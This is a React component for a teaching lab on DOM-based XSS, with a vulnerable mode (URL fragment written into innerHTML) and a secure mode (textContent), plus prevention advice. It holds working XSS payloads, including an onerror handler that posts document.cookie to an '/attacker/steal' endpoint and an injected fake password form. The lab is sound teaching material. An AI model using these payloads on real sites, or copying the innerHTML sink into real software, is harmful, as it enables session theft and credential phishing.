import { useState, useEffect, useCallback } from 'react'

function DOMXSS({ mode }) {
  const [logs, setLogs] = useState([])
  const [currentInput, setCurrentInput] = useState('')

  // Memoize the processUrlFragment function to prevent infinite loops
  const processUrlFragment = useCallback(() => {
    // Get the fragment (everything after #)
    const fragment = window.location.hash.slice(1)
    
    if (fragment) {
      try {
        // Decode the fragment so < and > are readable
        const decodedInput = decodeURIComponent(fragment)
        setCurrentInput(decodedInput)
        
        // Step 3: Inject into Receiver element (Sink)
        const receiverElement = document.getElementById('welcome-message')
        
        if (receiverElement && mode === 'vulnerable') {
          // Check if this payload has already been executed to prevent infinite loops
          if (receiverElement.dataset.lastPayload === decodedInput) {
            return; // Skip if same payload already executed
          }
          
          // VULNERABLE: Direct innerHTML injection - allows XSS execution
          receiverElement.innerHTML = `Welcome, ${decodedInput}!`
          
          // Mark this payload as executed
          receiverElement.dataset.lastPayload = decodedInput;
          
          // Log the vulnerability
          setLogs(prev => [{
            timestamp: new Date().toISOString(),
            source: 'URL Fragment (window.location.hash)',
            payload: decodedInput,
            sink: 'innerHTML injection',
            status: 'EXECUTED',
            vulnerability: 'DOM XSS - Direct innerHTML without sanitization'
          }, ...prev])
          
        } else if (receiverElement && mode === 'secure') {
          // SECURE: Use textContent to prevent HTML execution
          receiverElement.textContent = `Welcome, ${decodedInput}!`
          
          // Log the protection
          setLogs(prev => [{
            timestamp: new Date().toISOString(),
            source: 'URL Fragment (window.location.hash)',
            payload: decodedInput,
            sink: 'textContent (safe)',
            status: 'BLOCKED',
            protection: 'textContent prevents HTML execution'
          }, ...prev])
        }
      } catch (error) {
        console.error('Error processing URL fragment:', error)
        setCurrentInput('Error decoding fragment')
      }
    } else {
      setCurrentInput('')
      // Clear the receiver when no input
      const receiverElement = document.getElementById('welcome-message')
      if (receiverElement) {
        receiverElement.innerHTML = 'Welcome, Guest!'
        receiverElement.style.background = ''
        receiverElement.style.border = ''
        // Clear the payload tracking
        delete receiverElement.dataset.lastPayload;
      }
    }
  }, [mode])

  useEffect(() => {
    // Set some demo cookies for the cookie stealing demonstration
    if (!document.cookie.includes('demo_session')) {
      document.cookie = 'demo_session=abc123; path=/'
      document.cookie = 'user_pref=dark_mode; path=/'
      document.cookie = 'csrf_token=xyz789; path=/'
    }

    // Process on mount and mode change
    processUrlFragment()

    // Listen for hash changes (when user navigates or URL changes)
    const handleHashChange = () => {
      processUrlFragment()
    }

    window.addEventListener('hashchange', handleHashChange)
    
    return () => {
      window.removeEventListener('hashchange', handleHashChange)
    }
  }, [processUrlFragment])

  // Helper function to demonstrate payloads
  const testPayload = useCallback((payload) => {
    try {
      // Update the URL hash with the payload
      window.location.hash = encodeURIComponent(payload)
    } catch (error) {
      console.error('Error setting payload:', error)
    }
  }, [])

  const clearDemo = useCallback(() => {
    try {
      window.location.hash = ''
      setLogs([])
      setCurrentInput('')
      
      // Reset the welcome message box only
      const receiverElement = document.getElementById('welcome-message')
      if (receiverElement) {
        receiverElement.innerHTML = 'Welcome, Guest!'
        receiverElement.style.background = ''
        receiverElement.style.border = ''
        // Clear the payload tracking to allow fresh execution
        delete receiverElement.dataset.lastPayload;
      }
    } catch (error) {
      console.error('Error clearing demo:', error)
    }
  }, [])

  return (
    <div className="content-section">
      <div className="glass-card">
        <div className="section-header">
          <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
            <div>
              <h1 className="section-title">DOM-Based XSS Lab</h1>
              <p className="section-subtitle">Learn how DOM XSS works step-by-step</p>
            </div>
            <span className="badge">
              {mode === 'vulnerable' ? '⚠️ VULNERABLE' : '🔒 SECURE'}
            </span>
          </div>
        </div>

        {/* Step-by-step explanation */}
        <div className="alert-box">
          <h3 className="alert-title">🎯 DOM XSS Lab Steps</h3>
          <div className="alert-content">
            <div style={{ display: 'grid', gap: '1rem', marginBottom: '1.5rem' }}>
              <div style={{ padding: '1rem', background: 'rgba(59, 130, 246, 0.1)', border: '1px solid rgba(59, 130, 246, 0.3)', borderRadius: '8px' }}>
                <strong>Step 1 - Receiver Element (Sink):</strong> The welcome message below is our target container
              </div>
              <div style={{ padding: '1rem', background: 'rgba(59, 130, 246, 0.1)', border: '1px solid rgba(59, 130, 246, 0.3)', borderRadius: '8px' }}>
                <strong>Step 2 - Source:</strong> We use the URL fragment (everything after #) as our input source
              </div>
              <div style={{ padding: '1rem', background: 'rgba(59, 130, 246, 0.1)', border: '1px solid rgba(59, 130, 246, 0.3)', borderRadius: '8px' }}>
                <strong>Step 3 - Processing Logic:</strong> JavaScript reads the fragment and injects it into the DOM
              </div>
              <div style={{ padding: '1rem', background: 'rgba(59, 130, 246, 0.1)', border: '1px solid rgba(59, 130, 246, 0.3)', borderRadius: '8px' }}>
                <strong>Step 4 - Payload:</strong> Try the demo payloads below to see XSS in action
              </div>
              <div style={{ padding: '1rem', background: 'rgba(59, 130, 246, 0.1)', border: '1px solid rgba(59, 130, 246, 0.3)', borderRadius: '8px' }}>
                <strong>Step 5 - Execution:</strong> Watch the payload execute when the URL updates
              </div>
            </div>
          </div>
        </div>

        {/* Step 1: Receiver Element (Sink) */}
        <div style={{ marginTop: '2rem' }}>
          <h3 className="section-title" style={{ fontSize: '1.125rem', marginBottom: '0.75rem' }}>
            Step 1: Receiver Element (The Sink)
          </h3>
          <div style={{ 
            border: mode === 'vulnerable' ? '2px solid rgba(239, 68, 68, 0.5)' : '2px solid rgba(20, 184, 166, 0.5)',
            borderRadius: '8px',
            padding: '2rem',
            textAlign: 'center',
            background: mode === 'vulnerable' ? 'rgba(239, 68, 68, 0.1)' : 'rgba(20, 184, 166, 0.1)',
            fontSize: '1.5rem',
            fontWeight: 'bold'
          }}>
            {/* This is our vulnerable sink - the target for injection */}
            <div id="welcome-message" style={{ color: mode === 'vulnerable' ? '#fca5a5' : '#6ee7b7' }}>
              Welcome, Guest!
            </div>
          </div>
          <p style={{ marginTop: '0.5rem', fontSize: '0.875rem', color: 'var(--text-secondary)' }}>
            This div element will display content based on the URL fragment. In vulnerable mode, it uses innerHTML.
          </p>
        </div>

        {/* Step 2 & 3: Source and Processing */}
        <div style={{ marginTop: '2rem' }}>
          <h3 className="section-title" style={{ fontSize: '1.125rem', marginBottom: '0.75rem' }}>
            Step 2 & 3: URL Fragment Source + Processing Logic
          </h3>
          <div style={{ 
            background: 'rgba(0, 0, 0, 0.3)', 
            padding: '1rem', 
            borderRadius: '8px',
            border: '1px solid rgba(255, 255, 255, 0.1)',
            fontFamily: 'monospace',
            fontSize: '0.875rem',
            wordBreak: 'break-all'
          }}>
            <div style={{ color: '#22d3ee', marginBottom: '0.5rem' }}>Current URL:</div>
            <div style={{ color: 'var(--accent-light)' }}>{window.location.href}</div>
            {currentInput && (
              <>
                <div style={{ color: '#22d3ee', marginTop: '1rem', marginBottom: '0.5rem' }}>Extracted Fragment:</div>
                <div style={{ color: '#fbbf24' }}>{currentInput}</div>
              </>
            )}
          </div>
        </div>

        {/* Step 4: Demo Payloads */}
        <div style={{ marginTop: '2rem' }}>
          <h3 className="section-title" style={{ fontSize: '1.125rem', marginBottom: '0.75rem' }}>
            Step 4: Try These Payloads
          </h3>
          <div style={{ display: 'grid', gap: '1rem' }}>
            {/* Basic visual payload - changes welcome box background */}
            <div style={{ display: 'flex', alignItems: 'center', gap: '1rem', padding: '1rem', background: 'rgba(255, 255, 255, 0.05)', borderRadius: '8px' }}>
              <div style={{ flex: 1 }}>
                <code style={{ color: '#fbbf24', fontSize: '0.875rem', display: 'block' }}>
                  &lt;img src=x onerror="this.parentNode.style.background='red'"&gt;
                </code>
                <small style={{ color: 'var(--text-secondary)', fontSize: '0.75rem' }}>Changes welcome box background to red</small>
              </div>
              <button
                className="payload-button"
                onClick={() => testPayload('<img src=x onerror="this.parentNode.style.background=\'rgba(255,0,0,0.3)\';this.parentNode.style.border=\'2px solid red\'">')}
              >
                Test
              </button>
            </div>

            {/* Simple content injection using img onerror */}
            <div style={{ display: 'flex', alignItems: 'center', gap: '1rem', padding: '1rem', background: 'rgba(255, 255, 255, 0.05)', borderRadius: '8px' }}>
              <div style={{ flex: 1 }}>
                <code style={{ color: '#fbbf24', fontSize: '0.875rem', display: 'block' }}>
                  &lt;img src=x onerror="this.nextSibling.innerHTML='&lt;div style=color:red&gt;XSS!&lt;/div&gt;'"&gt;&lt;div&gt;&lt;/div&gt;
                </code>
                <small style={{ color: 'var(--text-secondary)', fontSize: '0.75rem' }}>Adds red "XSS!" message to welcome box</small>
              </div>
              <button
                className="payload-button"
                onClick={() => testPayload('<img src=x onerror="this.nextSibling.innerHTML=\'<div style=color:red;font-weight:bold;padding:10px;background:rgba(255,0,0,0.1);border:1px solid red;border-radius:4px;>🚨 XSS EXECUTED!</div>\'"><div></div>')}
              >
                Test
              </button>
            </div>

            {/* SVG payload - creates SVG within welcome box */}
            <div style={{ display: 'flex', alignItems: 'center', gap: '1rem', padding: '1rem', background: 'rgba(255, 255, 255, 0.05)', borderRadius: '8px' }}>
              <div style={{ flex: 1 }}>
                <code style={{ color: '#fbbf24', fontSize: '0.875rem', display: 'block' }}>
                  &lt;svg width="200" height="50"&gt;&lt;text x="10" y="30" fill="red"&gt;SVG XSS!&lt;/text&gt;&lt;/svg&gt;
                </code>
                <small style={{ color: 'var(--text-secondary)', fontSize: '0.75rem' }}>Creates SVG with red text in welcome box</small>
              </div>
              <button
                className="payload-button"
                onClick={() => testPayload('<svg width="200" height="50" style="margin-top:10px;"><text x="10" y="30" fill="red" font-size="16">SVG XSS!</text></svg>')}
              >
                Test
              </button>
            </div>

            {/* Cookie stealing payload - shows cookies in welcome box */}
            <div style={{ display: 'flex', alignItems: 'center', gap: '1rem', padding: '1rem', background: 'rgba(255, 255, 255, 0.05)', borderRadius: '8px' }}>
              <div style={{ flex: 1 }}>
                <code style={{ color: '#fbbf24', fontSize: '0.875rem', display: 'block' }}>
                  &lt;img src=x onerror="this.nextSibling.innerHTML='Cookies: '+document.cookie"&gt;&lt;div&gt;&lt;/div&gt;
                </code>
                <small style={{ color: 'var(--text-secondary)', fontSize: '0.75rem' }}>Displays stolen cookies within the welcome box</small>
              </div>
              <button
                className="payload-button"
                onClick={() => testPayload('<img src=x onerror="this.nextSibling.innerHTML=\'<div style=color:orange;padding:10px;background:rgba(255,165,0,0.1);border:1px solid orange;border-radius:4px;><strong>🍪 COOKIES:</strong><br>\' + (document.cookie || \'No cookies\') + \'</div>\'"><div></div>')}
              >
                Test
              </button>
            </div>

            {/* Data exfiltration simulation using img onerror */}
            <div style={{ display: 'flex', alignItems: 'center', gap: '1rem', padding: '1rem', background: 'rgba(255, 255, 255, 0.05)', borderRadius: '8px' }}>
              <div style={{ flex: 1 }}>
                <code style={{ color: '#fbbf24', fontSize: '0.875rem', display: 'block' }}>
                  &lt;img src=x onerror="fetch('/steal').catch(e=>console.log('Blocked'))"&gt;
                </code>
                <small style={{ color: 'var(--text-secondary)', fontSize: '0.75rem' }}>Attempts to send cookies to attacker server</small>
              </div>
              <button
                className="payload-button"
                onClick={() => testPayload('<img src=x onerror="fetch(\'/attacker/steal\', {method:\'POST\', body:document.cookie}).then(()=>this.nextSibling.innerHTML=\'<div style=color:green;padding:10px;background:rgba(0,255,0,0.1);border:1px solid green;border-radius:4px;>✅ Data sent!</div>\').catch(e=>this.nextSibling.innerHTML=\'<div style=color:red;padding:10px;background:rgba(255,0,0,0.1);border:1px solid red;border-radius:4px;>🚨 Tried to steal cookies</div>\')"><div></div>')}
              >
                Test
              </button>
            </div>

            {/* Form hijacking payload - adds fake form to welcome box */}
            <div style={{ display: 'flex', alignItems: 'center', gap: '1rem', padding: '1rem', background: 'rgba(255, 255, 255, 0.05)', borderRadius: '8px' }}>
              <div style={{ flex: 1 }}>
                <code style={{ color: '#fbbf24', fontSize: '0.875rem', display: 'block' }}>
                  &lt;form onsubmit="console.log('Stolen password')"&gt;&lt;input type="password"&gt;&lt;/form&gt;
                </code>
                <small style={{ color: 'var(--text-secondary)', fontSize: '0.75rem' }}>Injects fake login form to steal credentials</small>
              </div>
              <button
                className="payload-button"
                onClick={() => testPayload('<div style="margin-top:10px;padding:10px;background:rgba(255,255,0,0.1);border:1px solid yellow;border-radius:4px;"><strong>🎣 FAKE LOGIN:</strong><form onsubmit="event.preventDefault();this.parentNode.innerHTML+=\'<div style=color:red;margin-top:5px;>Password stolen: \' + this.password.value + \'</div>\'" style="margin-top:5px;"><input type="password" name="password" placeholder="Enter password" style="padding:5px;margin-right:5px;border:1px solid #ccc;"><button type="submit" style="padding:5px 10px;background:#007bff;color:white;border:none;cursor:pointer;">Login</button></form></div>')}
              >
                Test
              </button>
            </div>
          </div>

          <div style={{ marginTop: '1rem', display: 'flex', gap: '1rem', alignItems: 'center' }}>
            <button
              onClick={clearDemo}
              style={{
                padding: '0.5rem 1rem',
                background: 'rgba(239, 68, 68, 0.2)',
                border: '1px solid rgba(239, 68, 68, 0.5)',
                borderRadius: '6px',
                color: '#fca5a5',
                cursor: 'pointer'
              }}
            >
              🧹 Clear Demo & Reset Page
            </button>
            
            {mode === 'vulnerable' && (
              <div style={{ 
                padding: '0.5rem 1rem', 
                background: 'rgba(239, 68, 68, 0.1)', 
                border: '1px solid rgba(239, 68, 68, 0.3)', 
                borderRadius: '6px',
                color: '#fca5a5',
                fontSize: '0.875rem'
              }}>
                ⚠️ Vulnerable Mode: XSS will execute
              </div>
            )}
            
            {mode === 'secure' && (
              <div style={{ 
                padding: '0.5rem 1rem', 
                background: 'rgba(16, 185, 129, 0.1)', 
                border: '1px solid rgba(16, 185, 129, 0.3)', 
                borderRadius: '6px',
                color: '#6ee7b7',
                fontSize: '0.875rem'
              }}>
                🛡️ Secure Mode: XSS will be blocked
              </div>
            )}
          </div>
        </div>

        {/* Step 5: Execution Logs */}
        <div style={{ marginTop: '2rem' }}>
          <h3 className="section-title" style={{ fontSize: '1.125rem', marginBottom: '0.75rem' }}>
            Step 5: Execution Results
          </h3>
          
          <div className="logs-panel">
            {logs.length === 0 ? (
              <div className="empty-state">
                <div className="empty-state-icon">📝</div>
                <p className="empty-state-text">No DOM manipulations yet.</p>
                <p className="empty-state-subtext">Try one of the payloads above to see the execution flow.</p>
              </div>
            ) : (
              logs.map((log, idx) => (
                <div key={idx} className="log-entry">
                  <div className="log-header">
                    <span className="log-time">
                      {new Date(log.timestamp).toLocaleTimeString()}
                    </span>
                    <span className={`log-type ${log.status === 'EXECUTED' ? 'text-red-400' : 'text-green-400'}`} style={{ 
                      color: log.status === 'EXECUTED' ? '#fca5a5' : '#6ee7b7',
                      fontWeight: 600 
                    }}>
                      {log.status === 'EXECUTED' ? '⚠️ XSS EXECUTED' : '🛡️ XSS BLOCKED'}
                    </span>
                  </div>
                  
                  <div style={{ marginTop: '0.5rem', fontSize: '0.875rem' }}>
                    <div><strong>Source:</strong> {log.source}</div>
                    <div><strong>Sink:</strong> {log.sink}</div>
                    <div><strong>Payload:</strong> <code style={{ color: '#fbbf24' }}>{log.payload}</code></div>
                  </div>
                  
                  {log.vulnerability && (
                    <div style={{ 
                      marginTop: '0.5rem', 
                      padding: '0.5rem', 
                      background: 'rgba(239, 68, 68, 0.1)',
                      border: '1px solid rgba(239, 68, 68, 0.3)',
                      borderRadius: '4px',
                      fontSize: '0.875rem',
                      color: '#fca5a5'
                    }}>
                      <strong>Vulnerability:</strong> {log.vulnerability}
                    </div>
                  )}
                  
                  {log.protection && (
                    <div style={{ 
                      marginTop: '0.5rem', 
                      padding: '0.5rem', 
                      background: 'rgba(16, 185, 129, 0.1)',
                      border: '1px solid rgba(16, 185, 129, 0.3)',
                      borderRadius: '4px',
                      fontSize: '0.875rem',
                      color: '#6ee7b7'
                    }}>
                      <strong>Protection:</strong> {log.protection}
                    </div>
                  )}
                </div>
              ))
            )}
          </div>
        </div>
      </div>

      {/* Educational content */}
      <div className="glass-card">
        <div className="section-header">
          <h2 className="section-title">Understanding DOM-Based XSS</h2>
          <p className="section-subtitle">Key concepts and defense strategies</p>
        </div>
        
        <div className="info-grid">
          <div className="info-card">
            <h3 className="info-card-title">🎯 How It Works</h3>
            <div className="info-card-content">
              <p><strong>Source:</strong> URL fragment (#) contains malicious payload</p>
              <p><strong>Processing:</strong> JavaScript reads and decodes the fragment</p>
              <p><strong>Sink:</strong> Payload gets injected into DOM via innerHTML</p>
              <p><strong>Execution:</strong> Browser executes the injected script</p>
              <p><strong>Impact:</strong> Runs entirely client-side, bypassing server filters</p>
            </div>
          </div>
          
          <div className="info-card">
            <h3 className="info-card-title">🛡️ Prevention</h3>
            <div className="info-card-content">
              <p><strong>Use textContent:</strong> Prevents HTML parsing and execution</p>
              <p><strong>Sanitize input:</strong> Use libraries like DOMPurify</p>
              <p><strong>Validate sources:</strong> Check URL parameters before use</p>
              <p><strong>CSP headers:</strong> Block inline script execution</p>
              <p><strong>Avoid innerHTML:</strong> Use safer DOM manipulation methods</p>
            </div>
          </div>
        </div>

        <div style={{ marginTop: '2rem', padding: '1rem', background: 'rgba(59, 130, 246, 0.1)', border: '1px solid rgba(59, 130, 246, 0.3)', borderRadius: '8px' }}>
          <h4 style={{ color: '#60a5fa', marginBottom: '0.5rem' }}>💡 Why URL Fragments?</h4>
          <p style={{ margin: 0, fontSize: '0.875rem', color: 'var(--text-secondary)', marginBottom: '1rem' }}>
            URL fragments (everything after #) are perfect for DOM XSS demos because they're processed entirely client-side. 
            Unlike query parameters, fragments aren't sent to the server, making this a "pure" client-side attack that 
            bypasses server-side security filters.
          </p>
          
          <h4 style={{ color: '#60a5fa', marginBottom: '0.5rem' }}>⚠️ Why Script Tags Don't Work in innerHTML</h4>
          <p style={{ margin: 0, fontSize: '0.875rem', color: 'var(--text-secondary)' }}>
            When you use <code>innerHTML</code> to inject <code>&lt;script&gt;</code> tags, they don't execute for security reasons. 
            That's why real XSS attacks use event handlers like <code>onerror</code>, <code>onload</code>, or <code>onclick</code> 
            to execute JavaScript code. These event-based payloads bypass the script tag restriction.
          </p>
        </div>
      </div>
    </div>
  )
}

export default DOMXSS

